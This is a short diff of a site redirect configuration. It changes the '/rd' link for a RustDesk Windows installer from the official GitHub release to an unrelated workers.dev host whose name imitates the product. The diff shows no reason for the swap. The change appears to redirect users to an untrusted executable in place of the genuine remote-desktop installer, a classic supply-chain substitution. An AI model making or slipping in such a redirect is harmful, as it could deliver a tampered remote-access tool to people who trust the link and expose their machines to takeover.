@@ -18,7 +18,7 @@
 
 [[redirects]]
   from = "/rd"
-  to = "https://github.com/rustdesk/rustdesk/releases/download/1.2.7/rustdesk-1.2.7-x86_64.exe"
+  to = "https://rust-desk-exe.musosoft.workers.dev/"
   status = 302
   
 [[redirects]]
